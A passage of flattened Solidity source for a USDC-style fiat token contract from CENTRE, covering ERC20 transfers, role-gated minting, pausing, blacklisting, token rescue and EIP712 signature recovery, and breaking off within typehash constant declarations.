afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an &#123;Approval&#125; event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n&#125;\n\n\n\nabstract contract AbstractFiatTokenV1 is IERC20 &#123;\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) internal virtual;\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal virtual;\n&#125;\n\ncontract Ownable &#123;\n    // Owner of the contract\n    address private _owner;\n\n    /**\n     * @dev Event to show ownership has been transferred\n     * @param previousOwner representing the address of the previous owner\n     * @param newOwner representing the address of the new owner\n     */\n    event OwnershipTransferred(address previousOwner, address newOwner);\n\n    /**\n     * @dev The constructor sets the original owner of the contract to the sender account.\n     */\n    constructor() public &#123;\n        setOwner(msg.sender);\n    &#125;\n\n    /**\n     * @dev Tells the address of the owner\n     * @return the address of the owner\n     */\n    function owner() external view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Sets a new owner address\n     */\n    function setOwner(address newOwner) internal &#123;\n        _owner = newOwner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    /**\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */\n    function transferOwnership(address newOwner) external onlyOwner &#123;\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n        emit OwnershipTransferred(_owner, newOwner);\n        setOwner(newOwner);\n    &#125;\n&#125;\ncontract Pausable is Ownable &#123;\n    event Pause();\n    event Unpause();\n    event PauserChanged(address indexed newAddress);\n\n    address public pauser;\n    bool public paused = false;\n\n    /**\n     * @dev Modifier to make a function callable only when the contract is not paused.\n     */\n    modifier whenNotPaused() &#123;\n        require(!paused, \"Pausable: paused\");\n        _;\n    &#125;\n\n    /**\n     * @dev throws if called by any account other than the pauser\n     */\n    modifier onlyPauser() &#123;\n        require(msg.sender == pauser, \"Pausable: caller is not the pauser\");\n        _;\n    &#125;\n\n    /**\n     * @dev called by the owner to pause, triggers stopped state\n     */\n    function pause() external onlyPauser &#123;\n        paused = true;\n        emit Pause();\n    &#125;\n\n    /**\n     * @dev called by the owner to unpause, returns to normal state\n     */\n    function unpause() external onlyPauser &#123;\n        paused = false;\n        emit Unpause();\n    &#125;\n\n    /**\n     * @dev update the pauser role\n     */\n    function updatePauser(address _newPauser) external onlyOwner &#123;\n        require(\n            _newPauser != address(0),\n            \"Pausable: new pauser is the zero address\"\n        );\n        pauser = _newPauser;\n        emit PauserChanged(pauser);\n    &#125;\n&#125;\n\ncontract Blacklistable is Ownable &#123;\n    address public blacklister;\n    mapping(address => bool) internal blacklisted;\n\n    event Blacklisted(address indexed _account);\n    event UnBlacklisted(address indexed _account);\n    event BlacklisterChanged(address indexed newBlacklister);\n\n    /**\n     * @dev Throws if called by any account other than the blacklister\n     */\n    modifier onlyBlacklister() &#123;\n        require(\n            msg.sender == blacklister,\n            \"Blacklistable: caller is not the blacklister\"\n        );\n        _;\n    &#125;\n\n    /**\n     * @dev Throws if argument account is blacklisted\n     * @param _account The address to check\n     */\n    modifier notBlacklisted(address _account) &#123;\n        require(\n            !blacklisted[_account],\n            \"Blacklistable: account is blacklisted\"\n        );\n        _;\n    &#125;\n\n    /**\n     * @dev Checks if account is blacklisted\n     * @param _account The address to check\n     */\n    function isBlacklisted(address _account) external view returns (bool) &#123;\n        return blacklisted[_account];\n    &#125;\n\n    /**\n     * @dev Adds account to blacklist\n     * @param _account The address to blacklist\n     */\n    function blacklist(address _account) external onlyBlacklister &#123;\n        blacklisted[_account] = true;\n        emit Blacklisted(_account);\n    &#125;\n\n    /**\n     * @dev Removes account from blacklist\n     * @param _account The address to remove from the blacklist\n     */\n    function unBlacklist(address _account) external onlyBlacklister &#123;\n        blacklisted[_account] = false;\n        emit UnBlacklisted(_account);\n    &#125;\n\n    function updateBlacklister(address _newBlacklister) external onlyOwner &#123;\n        require(\n            _newBlacklister != address(0),\n            \"Blacklistable: new blacklister is the zero address\"\n        );\n        blacklister = _newBlacklister;\n        emit BlacklisterChanged(blacklister);\n    &#125;\n&#125;\n\n\ncontract FiatTokenV1 is AbstractFiatTokenV1, Ownable, Pausable, Blacklistable &#123;\n    using SafeMath for uint256;\n\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    string public currency;\n    address public masterMinter;\n    bool internal initialized;\n\n    mapping(address => uint256) internal balances;\n    mapping(address => mapping(address => uint256)) internal allowed;\n    uint256 internal totalSupply_ = 0;\n    mapping(address => bool) internal minters;\n    mapping(address => uint256) internal minterAllowed;\n\n    event Mint(address indexed minter, address indexed to, uint256 amount);\n    event Burn(address indexed burner, uint256 amount);\n    event MinterConfigured(address indexed minter, uint256 minterAllowedAmount);\n    event MinterRemoved(address indexed oldMinter);\n    event MasterMinterChanged(address indexed newMasterMinter);\n\n    function initialize(\n        string memory tokenName,\n        string memory tokenSymbol,\n        string memory tokenCurrency,\n        uint8 tokenDecimals,\n        address newMasterMinter,\n        address newPauser,\n        address newBlacklister,\n        address newOwner\n    ) public &#123;\n        require(!initialized, \"FiatToken: contract is already initialized\");\n        require(\n            newMasterMinter != address(0),\n            \"FiatToken: new masterMinter is the zero address\"\n        );\n        require(\n            newPauser != address(0),\n            \"FiatToken: new pauser is the zero address\"\n        );\n        require(\n            newBlacklister != address(0),\n            \"FiatToken: new blacklister is the zero address\"\n        );\n        require(\n            newOwner != address(0),\n            \"FiatToken: new owner is the zero address\"\n        );\n\n        name = tokenName;\n        symbol = tokenSymbol;\n        currency = tokenCurrency;\n        decimals = tokenDecimals;\n        masterMinter = newMasterMinter;\n        pauser = newPauser;\n        blacklister = newBlacklister;\n        setOwner(newOwner);\n        initialized = true;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than a minter\n     */\n    modifier onlyMinters() &#123;\n        require(minters[msg.sender], \"FiatToken: caller is not a minter\");\n        _;\n    &#125;\n\n    /**\n     * @dev Function to mint tokens\n     * @param _to The address that will receive the minted tokens.\n     * @param _amount The amount of tokens to mint. Must be less than or equal\n     * to the minterAllowance of the caller.\n     * @return A boolean that indicates if the operation was successful.\n     */\n    function mint(address _to, uint256 _amount)\n        external\n        whenNotPaused\n        onlyMinters\n        notBlacklisted(msg.sender)\n        notBlacklisted(_to)\n        returns (bool)\n    &#123;\n        require(_to != address(0), \"FiatToken: mint to the zero address\");\n        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\n\n        uint256 mintingAllowedAmount = minterAllowed[msg.sender];\n        require(\n            _amount &lt;= mintingAllowedAmount,\n            \"FiatToken: mint amount exceeds minterAllowance\"\n        );\n\n        totalSupply_ = totalSupply_.add(_amount);\n        balances[_to] = balances[_to].add(_amount);\n        minterAllowed[msg.sender] = mintingAllowedAmount.sub(_amount);\n        emit Mint(msg.sender, _to, _amount);\n        emit Transfer(address(0), _to, _amount);\n        return true;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the masterMinter\n     */\n    modifier onlyMasterMinter() &#123;\n        require(\n            msg.sender == masterMinter,\n            \"FiatToken: caller is not the masterMinter\"\n        );\n        _;\n    &#125;\n\n    /**\n     * @dev Get minter allowance for an account\n     * @param minter The address of the minter\n     */\n    function minterAllowance(address minter) external view returns (uint256) &#123;\n        return minterAllowed[minter];\n    &#125;\n\n    /**\n     * @dev Checks if account is a minter\n     * @param account The address to check\n     */\n    function isMinter(address account) external view returns (bool) &#123;\n        return minters[account];\n    &#125;\n\n    /**\n     * @notice Amount of remaining tokens spender is allowed to transfer on\n     * behalf of the token owner\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @return Allowance amount\n     */\n    function allowance(address owner, address spender)\n        external\n        override\n        view\n        returns (uint256)\n    &#123;\n        return allowed[owner][spender];\n    &#125;\n\n    /**\n     * @dev Get totalSupply of token\n     */\n    function totalSupply() external override view returns (uint256) &#123;\n        return totalSupply_;\n    &#125;\n\n    /**\n     * @dev Get token balance of an account\n     * @param account address The account\n     */\n    function balanceOf(address account)\n        external\n        override\n        view\n        returns (uint256)\n    &#123;\n        return balances[account];\n    &#125;\n\n    /**\n     * @notice Set spender's allowance over the caller's tokens to be a given\n     * value.\n     * @param spender   Spender's address\n     * @param value     Allowance amount\n     * @return True if successful\n     */\n    function approve(address spender, uint256 value)\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(spender)\n        returns (bool)\n    &#123;\n        _approve(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    /**\n     * @dev Internal function to set allowance\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param value     Allowance amount\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) internal override &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        allowed[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    &#125;\n\n    /**\n     * @notice Transfer tokens by spending allowance\n     * @param from  Payer's address\n     * @param to    Payee's address\n     * @param value Transfer amount\n     * @return True if successful\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    )\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(from)\n        notBlacklisted(to)\n        returns (bool)\n    &#123;\n        require(\n            value &lt;= allowed[from][msg.sender],\n            \"ERC20: transfer amount exceeds allowance\"\n        );\n        _transfer(from, to, value);\n        allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);\n        return true;\n    &#125;\n\n    /**\n     * @notice Transfer tokens from the caller\n     * @param to    Payee's address\n     * @param value Transfer amount\n     * @return True if successful\n     */\n    function transfer(address to, uint256 value)\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(to)\n        returns (bool)\n    &#123;\n        _transfer(msg.sender, to, value);\n        return true;\n    &#125;\n\n    /**\n     * @notice Internal function to process transfers\n     * @param from  Payer's address\n     * @param to    Payee's address\n     * @param value Transfer amount\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal override &#123;\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(\n            value &lt;= balances[from],\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        balances[from] = balances[from].sub(value);\n        balances[to] = balances[to].add(value);\n        emit Transfer(from, to, value);\n    &#125;\n\n    /**\n     * @dev Function to add/update a new minter\n     * @param minter The address of the minter\n     * @param minterAllowedAmount The minting amount allowed for the minter\n     * @return True if the operation was successful.\n     */\n    function configureMinter(address minter, uint256 minterAllowedAmount)\n        external\n        whenNotPaused\n        onlyMasterMinter\n        returns (bool)\n    &#123;\n        minters[minter] = true;\n        minterAllowed[minter] = minterAllowedAmount;\n        emit MinterConfigured(minter, minterAllowedAmount);\n        return true;\n    &#125;\n\n    /**\n     * @dev Function to remove a minter\n     * @param minter The address of the minter to remove\n     * @return True if the operation was successful.\n     */\n    function removeMinter(address minter)\n        external\n        onlyMasterMinter\n        returns (bool)\n    &#123;\n        minters[minter] = false;\n        minterAllowed[minter] = 0;\n        emit MinterRemoved(minter);\n        return true;\n    &#125;\n\n    /**\n     * @dev allows a minter to burn some of its own tokens\n     * Validates that caller is a minter and that sender is not blacklisted\n     * amount is less than or equal to the minter's account balance\n     * @param _amount uint256 the amount of tokens to be burned\n     */\n    function burn(uint256 _amount)\n        external\n        whenNotPaused\n        onlyMinters\n        notBlacklisted(msg.sender)\n    &#123;\n        uint256 balance = balances[msg.sender];\n        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n        require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n\n        totalSupply_ = totalSupply_.sub(_amount);\n        balances[msg.sender] = balance.sub(_amount);\n        emit Burn(msg.sender, _amount);\n        emit Transfer(msg.sender, address(0), _amount);\n    &#125;\n\n    function updateMasterMinter(address _newMasterMinter) external onlyOwner &#123;\n        require(\n            _newMasterMinter != address(0),\n            \"FiatToken: new masterMinter is the zero address\"\n        );\n        masterMinter = _newMasterMinter;\n        emit MasterMinterChanged(masterMinter);\n    &#125;\n&#125;\n\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address &#123;\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) &#123;\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n        // for accounts without code, i.e. `keccak256('')`\n        bytes32 codehash;\n\n            bytes32 accountHash\n         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        // solhint-disable-next-line no-inline-assembly\n        assembly &#123;\n            codehash := extcodehash(account)\n        &#125;\n        return (codehash != accountHash &amp;&amp; codehash != 0x0);\n    &#125;\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. &#123;sendValue&#125; removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * &#123;ReentrancyGuard&#125; or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        require(\n            address(this).balance >= amount,\n            \"Address: insufficient balance\"\n        );\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call.value(amount)(\"\");\n        require(\n            success,\n            \"Address: unable to send value, recipient may have reverted\"\n        );\n    &#125;\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain`call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data)\n        internal\n        returns (bytes memory)\n    &#123;\n        return functionCall(target, data, \"Address: low-level call failed\");\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) &#123;\n        return\n            functionCallWithValue(\n                target,\n                data,\n                value,\n                \"Address: low-level call with value failed\"\n            );\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCallWithValue-address-bytes-uint256-&#125;[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        require(\n            address(this).balance >= value,\n            \"Address: insufficient balance for call\"\n        );\n        return _functionCallWithValue(target, data, value, errorMessage);\n    &#125;\n\n    function _functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 weiValue,\n        string memory errorMessage\n    ) private returns (bytes memory) &#123;\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call.value(weiValue)(data);\n        if (success) &#123;\n            return returndata;\n        &#125; else &#123;\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) &#123;\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly &#123;\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                &#125;\n            &#125; else &#123;\n                revert(errorMessage);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\n\nlibrary SafeERC20 &#123;\n    using SafeMath for uint256;\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(token.transfer.selector, to, value)\n        );\n    &#125;\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)\n        );\n    &#125;\n\n    /**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * &#123;IERC20-approve&#125;, and its usage is discouraged.\n     *\n     * Whenever possible, use &#123;safeIncreaseAllowance&#125; and\n     * &#123;safeDecreaseAllowance&#125; instead.\n     */\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        // solhint-disable-next-line max-line-length\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(token.approve.selector, spender, value)\n        );\n    &#125;\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        uint256 newAllowance = token.allowance(address(this), spender).add(\n            value\n        );\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(\n                token.approve.selector,\n                spender,\n                newAllowance\n            )\n        );\n    &#125;\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        uint256 newAllowance = token.allowance(address(this), spender).sub(\n            value,\n            \"SafeERC20: decreased allowance below zero\"\n        );\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(\n                token.approve.selector,\n                spender,\n                newAllowance\n            )\n        );\n    &#125;\n\n    /**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */\n    function _callOptionalReturn(IERC20 token, bytes memory data) private &#123;\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n        // we're implementing it ourselves. We use &#123;Address.functionCall&#125; to perform this call, which verifies that\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = address(token).functionCall(\n            data,\n            \"SafeERC20: low-level call failed\"\n        );\n        if (returndata.length > 0) &#123;\n            // Return data is optional\n            // solhint-disable-next-line max-line-length\n            require(\n                abi.decode(returndata, (bool)),\n                \"SafeERC20: ERC20 operation did not succeed\"\n            );\n        &#125;\n    &#125;\n&#125;\n\n\ncontract Rescuable is Ownable &#123;\n    using SafeERC20 for IERC20;\n\n    address private _rescuer;\n\n    event RescuerChanged(address indexed newRescuer);\n\n    /**\n     * @notice Returns current rescuer\n     * @return Rescuer's address\n     */\n    function rescuer() external view returns (address) &#123;\n        return _rescuer;\n    &#125;\n\n    /**\n     * @notice Revert if called by any account other than the rescuer.\n     */\n    modifier onlyRescuer() &#123;\n        require(msg.sender == _rescuer, \"Rescuable: caller is not the rescuer\");\n        _;\n    &#125;\n\n    /**\n     * @notice Rescue ERC20 tokens locked up in this contract.\n     * @param tokenContract ERC20 token contract address\n     * @param to        Recipient address\n     * @param amount    Amount to withdraw\n     */\n    function rescueERC20(\n        IERC20 tokenContract,\n        address to,\n        uint256 amount\n    ) external onlyRescuer &#123;\n        tokenContract.safeTransfer(to, amount);\n    &#125;\n\n    /**\n     * @notice Assign the rescuer role to a given address.\n     * @param newRescuer New rescuer's address\n     */\n    function updateRescuer(address newRescuer) external onlyOwner &#123;\n        require(\n            newRescuer != address(0),\n            \"Rescuable: new rescuer is the zero address\"\n        );\n        _rescuer = newRescuer;\n        emit RescuerChanged(newRescuer);\n    &#125;\n&#125;\n\ncontract FiatTokenV1_1 is FiatTokenV1, Rescuable &#123;\n\n&#125;\n\n\nabstract contract AbstractFiatTokenV2 is AbstractFiatTokenV1 &#123;\n    function _increaseAllowance(\n        address owner,\n        address spender,\n        uint256 increment\n    ) internal virtual;\n\n    function _decreaseAllowance(\n        address owner,\n        address spender,\n        uint256 decrement\n    ) internal virtual;\n&#125;\n\nlibrary ECRecover &#123;\n    /**\n     * @notice Recover signer's address from a signed message\n     * @dev Adapted from: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65e4ffde586ec89af3b7e9140bdc9235d1254853/contracts/cryptography/ECDSA.sol\n     * Modifications: Accept v, r, and s as separate arguments\n     * @param digest    Keccak-256 hash digest of the signed message\n     * @param v         v of the signature\n     * @param r         r of the signature\n     * @param s         s of the signature\n     * @return Signer address\n     */\n    function recover(\n        bytes32 digest,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal pure returns (address) &#123;\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (281): 0 &lt; s &lt; secp256k1n Ã· 2 + 1, and for v in (282): v âˆˆ &#123;27, 28&#125;. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s) >\n            0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) &#123;\n            revert(\"ECRecover: invalid signature 's' value\");\n        &#125;\n\n        if (v != 27 &amp;&amp; v != 28) &#123;\n            revert(\"ECRecover: invalid signature 'v' value\");\n        &#125;\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(digest, v, r, s);\n        require(signer != address(0), \"ECRecover: invalid signature\");\n\n        return signer;\n    &#125;\n&#125;\n\n// File: contracts/util/EIP712.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n\n/**\n * @title EIP712\n * @notice A library that provides EIP712 helper functions\n */\nlibrary EIP712 &#123;\n    /**\n     * @notice Make EIP712 domain separator\n     * @param name      Contract name\n     * @param version   Contract version\n     * @return Domain separator\n     */\n    function makeDomainSeparator(string memory name, string memory version)\n        internal\n        view\n        returns (bytes32)\n    &#123;\n        uint256 chainId;\n        assembly &#123;\n            chainId := chainid()\n        &#125;\n        return\n            keccak256(\n                abi.encode(\n                    0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,\n                    // = keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\")\n                    keccak256(bytes(name)),\n                    keccak256(bytes(version)),\n                    chainId,\n                    address(this)\n                )\n            );\n    &#125;\n\n    /**\n     * @notice Recover signer's address from a EIP712 signature\n     * @param domainSeparator   Domain separator\n     * @param v                 v of the signature\n     * @param r                 r of the signature\n     * @param s                 s of the signature\n     * @param typeHashAndData   Type hash concatenated with data\n     * @return Signer's address\n     */\n    function recover(\n        bytes32 domainSeparator,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        bytes memory typeHashAndData\n    ) internal pure returns (address) &#123;\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                domainSeparator,\n                keccak256(typeHashAndData)\n            )\n        );\n        return ECRecover.recover(digest, v, r, s);\n    &#125;\n&#125;\n\n// File: contracts/v2/EIP712Domain.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n/**\n * @title EIP712 Domain\n */\ncontract EIP712Domain &#123;\n    /**\n     * @dev EIP712 Domain Separator\n     */\n    bytes32 public DOMAIN_SEPARATOR;\n&#125;\n\nabstract contract GasAbstraction is AbstractFiatTokenV2, EIP712Domain &#123;\n    bytes32\n        public constant TRANSFER_WITH_AUTHORIZATION_TYPEHASH = 0x7c7c6cdb67a18743f49ec6fa9b35f50d52ed05cbed4cc592e13b44501c1a2267;\n    // = keccak256(\"TransferWithAuthorization(address from,address to,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant APPROVE_WITH_AUTHORIZATION_TYPEHASH = 0x808c10407a796f3ef2c7ea38c0638ea9d2b8a1c63e3ca9e1f56ce84ae59df73c;\n    // = keccak256(\"ApproveWithAuthorization(address owner,address spender,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant INCREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH = 0x424222bb050a1f7f14017232a5671f2680a2d3420f504bd565cf03035c53198a;\n    // = keccak256(\"IncreaseAllowanceWithAuthorization(address owner,address spender,uint256 increment,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant DECREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH = 0xb70559e94cbda91958ebec07f9b65b3b490097c8d25c8dacd71105df1015b6d8;\n    // = keccak256(\"DecreaseAllowanceWithAuthorization(address owner,address spender,uint256 decrement,uint256 validAfter,uint256 